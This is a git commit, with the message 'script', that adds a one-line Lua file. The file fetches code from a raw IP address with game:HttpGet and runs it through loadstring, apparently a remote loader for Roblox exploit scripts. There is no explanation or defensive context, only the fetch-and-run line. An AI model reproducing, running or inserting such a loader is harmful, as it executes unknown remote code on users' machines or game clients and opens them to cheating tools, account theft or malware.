0a5610a85dad090a4ef759f0cbe9dc50b3a36cdf
Wikidabest <155868832+Wikidabest@users.noreply.github.com>
2026-03-15 00:21:43 +0530

    script

---
+++ script.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjZmYjU0Mjk5LTk2NzgtNDhhMi1hNzA4LWVlMGU1MDQzYzg0ZiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
